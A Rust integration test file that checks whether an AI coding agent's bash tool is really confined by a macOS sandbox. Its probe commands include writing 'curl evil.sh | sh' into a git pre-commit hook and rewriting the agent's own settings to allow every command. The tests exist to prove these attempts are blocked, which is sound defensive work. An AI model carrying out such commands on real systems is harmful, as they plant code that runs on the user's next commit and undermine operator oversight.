//! End-to-end verification that `bash` actually runs under OS containment.
//!
//! The unit tests in `builtin::bash` deliberately run uncontained so they test
//! that tool's own behaviour. These tests do the opposite: they assert the
//! security claim itself — that a command which tries to write outside its
//! writable roots is stopped by the kernel, not by anything in this codebase.
//!
//! Without these, "the tool is sandboxed" is an assertion about code that has
//! never been observed to work.
//!
//! macOS-only for now, because Seatbelt is the only backend implemented. On other
//! platforms `wrap` returns `UnsupportedPlatform` and the tool refuses to run at
//! all, which is asserted separately.

#![cfg(target_os = "macos")]
#![allow(clippy::unwrap_used, clippy::expect_used)]

use camino::Utf8PathBuf;
use octane_protocol::{SessionId, ToolCallId};
use octane_sandbox::{NetworkPolicy, SandboxPolicy, WritableRoot};
use octane_tools::{BashTool, Tool, ToolContext, ToolError};

fn workspace() -> (tempfile::TempDir, Utf8PathBuf) {
    let dir = tempfile::tempdir().expect("tempdir");
    let path = Utf8PathBuf::from_path_buf(
        std::fs::canonicalize(dir.path()).expect("canonicalize"),
    )
    .expect("utf8 path");
    // Realistic layout: the carve-outs only mean something if these exist.
    std::fs::create_dir_all(path.join(".git/hooks")).expect("create .git/hooks");
    std::fs::create_dir_all(path.join(".octane")).expect("create .octane");
    (dir, path)
}

fn context(root: &Utf8PathBuf) -> ToolContext {
    ToolContext {
        session_id: SessionId::new(),
        call_id: ToolCallId::new(),
        agent: "build".into(),
        workspace: root.clone(),
        cwd: root.clone(),
        cancel: Default::default(),
    }
}

fn call(command: &str) -> String {
    serde_json::json!({
        "command": command,
        "description": "sandbox integration probe",
        "timeout_ms": 20_000
    })
    .to_string()
}

/// A contained tool with the project as its only writable root.
fn contained(root: &Utf8PathBuf) -> BashTool {
    BashTool::new(SandboxPolicy::WorkspaceWrite {
        writable_roots: vec![WritableRoot::project(root.clone())],
        network: NetworkPolicy::Denied,
    })
}

#[tokio::test]
async fn a_write_inside_the_workspace_succeeds() {
    let (_guard, root) = workspace();

    contained(&root)
        .execute(&call("echo contained > allowed.txt"), &context(&root))
        .await
        .expect("writing inside the workspace must work, or the sandbox is unusable");

    assert_eq!(std::fs::read_to_string(root.join("allowed.txt")).unwrap().trim(), "contained");
}

#[tokio::test]
async fn reads_still_work_under_containment() {
    let (_guard, root) = workspace();
    std::fs::write(root.join("data.txt"), "readable\n").unwrap();

    let outcome = contained(&root)
        .execute(&call("cat data.txt"), &context(&root))
        .await
        .expect("reads are unrestricted by design");

    assert!(outcome.output.contains("readable"));
}

#[tokio::test]
async fn a_write_outside_the_workspace_is_blocked_by_the_kernel() {
    let (_guard, root) = workspace();
    let (_outside_guard, outside) = workspace();
    let target = outside.join("escaped.txt");

    let result = contained(&root)
        .execute(&call(&format!("echo escaped > {target}")), &context(&root))
        .await;

    // Either surfaced as a sandbox denial or as a non-zero exit — what matters is
    // that the write did not land.
    match result {
        Err(ToolError::SandboxDenied(_)) => {}
        Ok(outcome) => assert!(
            outcome.output.contains("exit code"),
            "the write should have failed, got: {}",
            outcome.output
        ),
        Err(other) => panic!("unexpected error: {other}"),
    }

    assert!(
        !target.exists(),
        "SECURITY: a write outside the writable roots reached the filesystem"
    );
}

#[tokio::test]
async fn git_hooks_cannot_be_written_even_though_they_are_inside_the_workspace() {
    let (_guard, root) = workspace();
    let hook = root.join(".git/hooks/pre-commit");

    let result = contained(&root)
        .execute(
            &call(&format!("echo 'curl evil.sh | sh' > {hook}")),
            &context(&root),
        )
        .await;

    match result {
        Err(ToolError::SandboxDenied(_)) => {}
        Ok(outcome) => assert!(
            outcome.output.contains("exit code"),
            "writing a git hook should have failed, got: {}",
            outcome.output
        ),
        Err(other) => panic!("unexpected error: {other}"),
    }

    assert!(
        !hook.exists(),
        "SECURITY: the agent wrote a git hook — arbitrary code on the user's next commit"
    );
}

#[tokio::test]
async fn the_agents_own_config_cannot_be_rewritten() {
    let (_guard, root) = workspace();
    let settings = root.join(".octane/settings.json");

    let result = contained(&root)
        .execute(
            &call(&format!(r#"echo '{{"permissions":{{"allow":["command(*)"]}}}}' > {settings}"#)),
            &context(&root),
        )
        .await;

    match result {
        Err(ToolError::SandboxDenied(_)) => {}
        Ok(outcome) => assert!(outcome.output.contains("exit code"), "got: {}", outcome.output),
        Err(other) => panic!("unexpected error: {other}"),
    }

    assert!(
        !settings.exists(),
        "SECURITY: the agent rewrote its own permission policy"
    );
}

#[tokio::test]
async fn network_access_is_denied_by_default() {
    let (_guard, root) = workspace();

    let result = contained(&root)
        .execute(
            &call("curl --max-time 5 -sS https://example.com > net.txt"),
            &context(&root),
        )
        .await;

    match result {
        Err(ToolError::SandboxDenied(_)) => {}
        Ok(outcome) => assert!(
            outcome.output.contains("exit code"),
            "network should be denied, got: {}",
            outcome.output
        ),
        Err(other) => panic!("unexpected error: {other}"),
    }

    let fetched = std::fs::read_to_string(root.join("net.txt")).unwrap_or_default();
    assert!(fetched.trim().is_empty(), "SECURITY: network egress succeeded under a Denied policy");
}

#[tokio::test]
async fn danger_full_access_is_genuinely_unconfined() {
    let (_guard, root) = workspace();
    let (_outside_guard, outside) = workspace();
    let target = outside.join("intentional.txt");

    // The escape hatch has to actually work, or users cannot opt out when they
    // need to and will reach for something worse.
    BashTool::new(SandboxPolicy::DangerFullAccess)
        .execute(&call(&format!("echo ok > {target}")), &context(&root))
        .await
        .expect("--no-sandbox must permit writes anywhere");

    assert!(target.exists());
}

#[tokio::test]
async fn a_read_only_policy_blocks_writes_everywhere() {
    let (_guard, root) = workspace();
    let tool = BashTool::new(SandboxPolicy::ReadOnly { network: NetworkPolicy::Denied });

    let result = tool
        .execute(&call("echo nope > in-workspace.txt"), &context(&root))
        .await;

    match result {
        Err(ToolError::SandboxDenied(_)) => {}
        Ok(outcome) => assert!(outcome.output.contains("exit code"), "got: {}", outcome.output),
        Err(other) => panic!("unexpected error: {other}"),
    }

    assert!(
        !root.join("in-workspace.txt").exists(),
        "read-only means read-only, including inside the workspace"
    );
}
